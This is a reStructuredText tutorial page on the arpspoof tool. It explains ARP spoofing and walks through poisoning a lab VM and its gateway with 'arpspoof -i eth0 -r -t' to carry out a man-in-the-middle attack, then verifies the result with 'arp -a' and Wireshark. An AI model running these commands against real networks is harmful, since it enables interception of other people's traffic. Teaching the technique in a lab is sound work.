.. _arpspoofpage:

ARPSpoof
========
ARPSpoof_ is a simple tool used to send out forged ARP responses.

ARPSpoof_ redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies.
This is an extremely effective way of sniffing traffic on a switch. 

.. note::

    ARPSpoof_ is part of the  `Dsniff <https://www.kali.org/tools/dsniff/>`_ tool package.

.. note::

    More about `Address Resolution Protocol (ARP) <https://www.fortinet.com/resources/cyberglossary/what-is-arp>`_ and `ARP Spoofing <https://www.imperva.com/learn/application-security/arp-spoofing/>`_.

Usage
-----
Typically, ARPSpoof_ is used as such:

.. code-block:: console

    arpspoof -i [INTERFACE] -t [TARGET] [HOST]

.. important::

    In order to conduct a successful MITM Attack, you must poison both ``TARGET`` and ``HOST``.
    You can achieve this either by running multiple ``arpspoof``, one with ``TARGET`` as the ``TARGET``, and the other one being ``HOST`` as the ``TARGET``; or run single ``arpspoof`` instance using the `-r`_ option.

Example
-------
.. note::

    This example utilizes :ref:`Dinero VM<dinero>`.

Dinero is located at ``192.168.233.128``, while the VMWare gateway is located at ``192.168.233.2``.
We will be using ``eth0`` network interface as the MITM.

To poison both the gateway and Dinero, we can use the command:

.. code-block:: console

    arpspoof -i eth0 -r -t 192.168.233.128 192.168.233.2

.. code-block:: console

    > arpspoof -i eth0 -r -t 192.168.233.128 192.168.233.2

    0:c:29:c9:e5:1b 0:c:29:a4:e8:6e 0806 42: arp reply 192.168.233.2 is-at 0:c:29:c9:e5:1b
    0:c:29:c9:e5:1b 0:50:56:f6:d5:14 0806 42: arp reply 192.168.233.128 is-at 0:c:29:c9:e5:1b
    [...]

We can see that Kali has started sending out forged ARP responses to both Dinero and the gateway.

We can verify if both ARP caches are poisoned, by running ``arp -a`` on either Dinero or the gateway, and check its respective MAC Addresses:

.. code-block:: console

    juarez@dinero:~$ arp -a

    ? (192.168.233.1) at 00:50:56:c0:00:08 [ether] on ens33
    ? (192.168.233.2) at 00:0c:29:c9:e5:1b [ether] on ens33
    ? (192.168.233.131) at 00:0c:29:c9:e5:1b [ether] on ens33
    ? (192.168.233.254) at 00:50:56:e5:2a:21 [ether] on ens33

Notice the MAC Address of Kali ``192.168.233.131`` and the gateway ``192.168.233.2`` is the same.
This implies that the ARP Poisoning is successful.

We can further check this by using sniffing tools such as `Wireshark <https://www.wireshark.org/>`_

.. image:: /images/wireshark.png
   :width: 800

We can see every packets flowing to and from Dinero ``192.168.233.128``.

Options
-------
-i <*interface*>
~~~~~~~~~~~~~~~~
    Specify the ``interface`` to use.

-c <*own|host|both*>
~~~~~~~~~~~~~~~~~~~~
    Specify which hardware address to use when restoring the arp configuration.

.. _ttoption:

-t <*target*>
~~~~~~~~~~~~~~
    Specify a particular host to ARP poison (if not specified, all hosts on the LAN).
    Repeat to specify multiple hosts.

-r
~~~
    Poison  both  hosts  (host  and target) to capture traffic in both directions.  (only valid in conjuntion with :ref:`-t<ttoption>`)

.. _ARPSpoof: https://linux.die.net/man/8/arpspoof